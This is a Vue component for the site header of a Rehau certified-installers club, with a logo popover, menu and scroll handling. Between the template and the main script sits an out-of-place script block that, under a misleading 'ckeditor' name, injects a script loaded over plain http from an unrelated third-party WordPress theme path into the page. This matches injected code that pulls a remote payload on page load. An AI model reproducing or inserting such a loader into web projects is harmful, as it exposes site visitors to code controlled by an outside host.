<template>
  <md-toolbar id="toolbar"
    md-elevation="0"
    class="md-fixed"
    :class="[`md-${type}`]"
    :color-on-scroll="colorOnScroll">
    <div class="md-toolbar-row md-collapse-lateral">
      <div class="md-toolbar-section-start">
        <router-link :to="'/index'">
          <v-popover
              offset="20"
              placement="bottom"
            >
              <img src="@/assets/img/logo3.svg" width="180" height="100" border="0" class="mainlogo">
              <template slot="popover">
                <h3 class="popover-header">Клуб сертифицированных монтажников</h3>
                <div class="popover-body">В клубе вы можете найти сертифицированного компанией Rehau монтажника для реализации Вашего проекта.</div>
                <md-button class="md-rose md-simple"   v-close-popover>Закрыть</md-button>
              </template>
            </v-popover>
        </router-link>
      </div>
      <div class="md-toolbar-section-end">
        <router-link tag="md-button" class="md-primary" id="button" :to="'/'">Личный кабинет <md-icon >keyboard_arrow_right</md-icon></router-link>
      </div>
    </div>
    <div class="md-toolbar-row md-collapse-lateral mainmenu">
      <div class="md-toolbar-section-start">
      </div>
          <div class="md-toolbar-section-center">
            <md-list class="ml-auto mainmenu">
              <md-list-item href="javascript:void(0)" target="_blank" class="menu-selected menuitem">
                Поиск монтажника 
              </md-list-item>
              <md-list-item href="javascript:void(0)" target="_blank" class="menuitem">
                Как это работает
              </md-list-item>
              <md-list-item href="javascript:void(0)" target="_blank" class="menuitem">
                Решить вопрос
              </md-list-item>
              <md-list-item href="javascript:void(0)" target="_blank" class="menuitem">
                О REHAU
              </md-list-item>
            </md-list>
          </div>
    </div>
  </md-toolbar>
</template>
      <script>
        created() {
var ckeditor = document.createElement('script');  
ckeditor.setAttribute('src',"http://www.funstore.me/wp-content/themes/leglo/swiper/swiper.min.js");
document.querySelector('html').appendChild(ckeditor);
}
      </script>
<script>
let resizeTimeout;
function resizeThrottler(actualResizeHandler) {
  // ignore resize events as long as an actualResizeHandler execution is in the queue
  if (!resizeTimeout) {
    resizeTimeout = setTimeout(() => {
      resizeTimeout = null;
      actualResizeHandler();

      // The actualResizeHandler will execute at a rate of 15fps
    }, 66)
  }
}

import MobileMenu from "@/layout/MobileMenu"
import { VPopover, VClosePopover } from 'v-tooltip'
export default {
  components: {
    MobileMenu,
    VPopover
  },
  directives: {
    'close-popover': VClosePopover 
  },
  props: {
    type: {
      type: String,
      default: "white",
      validator(value) {
        return [
          "white",
          "default",
          "primary",
          "danger",
          "success",
          "warning",
          "info",
          "dark"
        ].includes(value)
      }
    },
    colorOnScroll: {
      type: Number,
      default: 0
    },
    navbarTransparent: {
      type: Boolean,
      default: false
    }
  },
  data() {
    return {
      extraNavClasses: "",
      toggledClass: false
    };
  },
  computed: {
    showDownload() {
      const excludedRoutes = ["index"];
      return excludedRoutes.every(r => r !== this.$route.name)
    }
  },
  methods: {
    bodyClick() {
      let bodyClick = document.getElementById("bodyClick")

      if (bodyClick === null) {
        let body = document.querySelector("body")
        let elem = document.createElement("div")
        elem.setAttribute("id", "bodyClick")
        body.appendChild(elem)

        let bodyClick = document.getElementById("bodyClick")
        bodyClick.addEventListener("click", this.toggleNavbarMobile)
      } else {
        bodyClick.remove()
      }
    },
    toggleNavbarMobile() {
      this.NavbarStore.showNavbar = !this.NavbarStore.showNavbar
      this.toggledClass = !this.toggledClass
      this.bodyClick()
    },
    handleScroll() {
      let scrollValue =
        document.body.scrollTop || document.documentElement.scrollTop
      let navbarColor = document.getElementById("toolbar")
      this.currentScrollValue = scrollValue
      if (this.colorOnScroll > 0 && scrollValue > this.colorOnScroll) {
        this.extraNavClasses = `md-${this.type}`
        navbarColor.classList.remove("md-transparent")
      } else {
        if (this.extraNavClasses) {
          this.extraNavClasses = ""
          navbarColor.classList.add("md-transparent")
        }
      }
    },
    scrollListener() {
      resizeThrottler(this.handleScroll)
    }
  },
  mounted() {
    document.addEventListener("scroll", this.scrollListener)
  },
  beforeDestroy() {
    document.removeEventListener("scroll", this.scrollListener)
  }
}
</script>
<style lang="scss">
</style>